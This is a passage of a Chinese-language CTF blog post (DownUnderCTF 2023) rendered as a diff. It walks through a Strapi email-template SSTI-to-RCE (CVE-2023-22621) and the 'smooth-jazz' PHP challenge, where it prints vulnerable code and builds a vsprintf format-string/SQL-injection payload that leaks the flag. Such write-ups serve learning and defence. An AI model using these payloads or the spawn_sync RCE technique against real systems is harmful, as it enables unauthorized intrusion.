class="language-bash"> [<span class="string">&quot;npm&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;start&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+<p>然后这一题的话是CVE-2023-22621，具体分析可以看</p>
+<p><a target="_blank" rel="noopener" href="https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455">https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455</a></p>
+<p>上面那个分析中，比较有价值的是绕过正则表达式的一个手法，还有就是仅仅使用<code>$process.binding(&quot;spawn_sync&quot;).spawn().output()</code>的手法进行payload的构造</p>
+<p>如果是真实环境的话，使用下面的poc即可</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sofianeelhor/CVE-2023-22621-POC/blob/main/poc.py">CVE-2023-22621-POC/poc.py at main · sofianeelhor/CVE-2023-22621-POC · GitHub</a></p>
+<p>这道题目首先用admin的身份登录<code>README.md</code>中有（找半天），然后进行对email的模板进行改变，直接上exp</p>
+<p><img src="/img/image-20230910152045585.png" alt="image-20230910152045585" /></p>
+<p>因为在dockerfile中限制了权限，没有办法进行反弹bash的操作（甚至限制了curl）</p>
+<p><img src="/img/image-20230910152323396.png" alt="image-20230910152323396" /></p>
+<p><img src="/img/image-20230910152520657.png" alt="image-20230910152520657" /></p>
+<h3 id="smooth-jazz">smooth-jazz</h3>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.antoniusblock.net/posts/smooth-jazz/">https://blog.antoniusblock.net/posts/smooth-jazz/</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$mysqli</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;DB_HOST&#x27;</span>), <span class="string">&#x27;challuser&#x27;</span>, <span class="string">&#x27;challpass&#x27;</span>, <span class="string">&#x27;challenge&#x27;</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], [<span class="string">&#x27;&quot;&#x27;</span> =&gt; <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\\\\&#x27;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; AND password = &quot;%s&quot;&#x27;</span>, [<span class="variable">$password</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line">  <span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">      ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">      : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line">  </span><br><span class="line">  fail:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一步：</p>
+<p>username的字符截断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin == admin%ff+any</span><br></pre></td></tr></table></figure>
+<p>第二步</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>使用了<code>mysql_fquery</code>函数对其进行处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用了<code>vsprintf</code>函数，实际上在此处可以对$params进行注入，传入的是password，所以根据php的弱语言特性进行sql注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">sha1</span>(<span class="string">&quot;668&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">vsprintf</span>(<span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span> . <span class="string">&quot;%c&quot;</span>. <span class="string">&#x27;&quot; AND password = &#x27;</span>,[<span class="variable">$password</span>]);</span><br></pre></td></tr></table></figure>
+<p>实际上还可以定义顺序</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">vsprintf</span>(<span class="string">&quot;Second character: %2\$c. First character: %1\$c&quot;</span>,[<span class="string">&quot;97&quot;</span>, <span class="string">&quot;98&quot;</span>]);</span><br></pre></td></tr></table></figure>
+<p>利用%1,%2获取后面参数的数组位置</p>
+<p>然后初步构造的payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin%ff%1$c#&amp;password=668</span><br></pre></td></tr></table></figure>
+<p>实际上我们没办法直接传入一个调用两个说明符（不然就报错了），所以我们需要做一下处理</p>
+<p>第三步:利用转义将其转成我们想要的(天才的想法)</p>
+<ul>
+<li><code>%1$'&gt;%</code> : takes the parameter at position 1, using the value <code>&gt;</code> as padding character (<code>'(char)</code> is an optional flag in <code>vsprintf</code> that can be use for padding). It basically returns the character <code>%</code> (which is a valid specifier)</li>
+</ul>
+<p>利用可选占位，让其返回正常的%说明符(&gt;表示占位符号，也就是右对齐的意思，但是本质上就是预留空间的意思)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">1</span>$<span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string">$&#x27;</span>&gt; <span class="comment">//本身不会作为说明符的作用，但是会让后面的填充失效，原因在于这个填充是可选的，不一定会有...</span></span><br><span class="line">&gt; <span class="comment">//转义之后得到&amp;gt;而&amp;g也是作为一种浮点数说明符存在，然后就成功绕过了数组大小引发的问题</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="title function_ invoke__">sha1</span>(<span class="string">&quot;668&quot;</span>);</span><br><span class="line"><span class="variable">$username</span>= <span class="string">&quot;admin%1\$c#%1$&#x27;&gt;%2\$s&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$username</span> ,[<span class="variable">$password</span>,<span class="string">&#x27;aa&#x27;</span>]);</span><br><span class="line"><span class="comment">//admin&quot;#%2$s</span></span><br></pre></td></tr></table></figure>
+<p>最后填充的状态</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">vsprintf</span>(<span class="string">&quot;Hello admin%1<span class="subst">$c</span>#%1$&#x27;&amp;gt;%2<span class="subst">$s</span>, the server time is %s&quot;</span>,[<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)])</span><br></pre></td></tr></table></figure>
+<p>也就成功获取到了flag(最后还是弱语言的特性)</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>diffany
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gudiffany.github.io/2023/09/08/14-20-17/" title="2023DownUnderCTF">https://gudiffany.github.io/2023/09/08/14-20-17/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/2023ctf/" rel="tag"><i class="fa fa-tag"></i> 2023ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/09/04/10-26-47/" rel="prev" title="2023sekaiCTF">
+                  <i class="fa fa-chevron-left"></i> 2023sekaiCTF
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diffany</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+
+
+  <script src="[object Object]"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+
+
+<script>
+var options = {
+  bottom: '64px', // default: '32px'
+  right: 'unset', // default: '32px'
+  left: '32px', // default: 'unset'
+  time: '0.5s', // default: '0.3s'
+  mixColor: '#fff', // default: '#fff'
+  backgroundColor: '#fff',  // default: '#fff'
+  buttonColorDark: '#100f2c',  // default: '#100f2c'
+  buttonColorLight: '#fff', // default: '#fff'
+  saveInCookies: true, // default: true,
+  label: '🌓', // default: ''
+  autoMatchOsTheme: true // default: true
+}
+const darkmode = new Darkmode(options);
+darkmode.showWidget();
+</script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://unpkg.com/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ImshWy4c6kiRqFukNXuAeVYt-gzGzoHsz","app_key":"I15dpBmlxhPPxNgS0pn9Fer5","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://unpkg.com/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
